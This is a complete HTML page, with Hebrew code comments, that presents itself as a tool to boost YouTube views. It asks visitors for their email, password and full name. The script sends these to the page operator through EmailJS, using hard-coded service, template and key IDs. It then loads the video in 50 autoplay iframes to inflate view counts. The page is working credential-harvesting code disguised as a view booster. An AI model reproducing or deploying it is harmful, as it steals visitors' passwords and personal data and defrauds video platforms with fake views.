<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login to Maximize Views</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f4f8;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding-top: 50px;
      margin: 0;
    }

    .container {
      background-color: #fff;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      width: 400px;
      text-align: center;
    }

    h2 {
      margin-bottom: 20px;
      color: #333;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }

    button {
      background-color: #007bff;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      width: 100%;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }

    button:hover {
      background-color: #0056b3;
    }

    .message {
      margin-top: 15px;
      color: green;
    }

    .iframe-container {
      margin-top: 20px;
    }

    iframe {
      width: 100%;
      height: 200px;
      margin-bottom: 10px;
      border: none;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>To play the video 50 times and get maximum views, please log in</h2>
  
  <form id="loginForm">
    <!-- שמות השדות מותאמים ל-EmailJS -->
    <input type="email" name="user_email" placeholder="Email" required>
    <input type="password" name="user_password" placeholder="Password" required>
    <input type="text" name="user_name" placeholder="Full Name" required>
    <button type="submit">Submit</button>
  </form>
  
  <div class="message" id="message"></div>

  <!-- שדה קישור יופיע אחרי שליחת הטופס -->
  <div id="linkContainer" style="display:none; margin-top:20px;">
    <input type="text" id="youtubeLink" placeholder="Enter YouTube link">
    <button id="playVideoBtn">Play Video 50 Times</button>
  </div>

  <div class="iframe-container" id="iframeContainer"></div>
</div>

<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  (function() {
    emailjs.init("mXjVT9I9cjsBTVa-K"); // Public Key שלך
  })();

  const form = document.getElementById('loginForm');
  const messageDiv = document.getElementById('message');
  const linkContainer = document.getElementById('linkContainer');
  const youtubeInput = document.getElementById('youtubeLink');
  const playBtn = document.getElementById('playVideoBtn');
  const iframeContainer = document.getElementById('iframeContainer');

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    
    emailjs.sendForm('service_1407yso', 'template_rv2yd4n', this)
      .then(function() {
        messageDiv.textContent = "Form submitted successfully!";
        form.style.display = "none"; // מחביאים את הטופס אחרי שליחה
        linkContainer.style.display = "block"; // מראים את שדה הקישור
      }, function(error) {
        messageDiv.textContent = "Oops! Something went wrong.";
        console.error(error);
      });
  });

  playBtn.addEventListener('click', function() {
    let url = youtubeInput.value.trim();

    if (!url) {
      alert("Please enter a valid YouTube link");
      return;
    }

    // אין המרה מ-shorts ל-watch, פשוט משתמשים בקישור כפי שהוא

    // מנקים את הקונטיינר לפני הוספת iFrames
    iframeContainer.innerHTML = "";

    for (let i = 0; i < 50; i++) {
      const iframe = document.createElement('iframe');
      iframe.src = url;
      iframe.allow = "autoplay; encrypted-media";
      iframeContainer.appendChild(iframe);
    }
  });
</script>

</body>
</html>
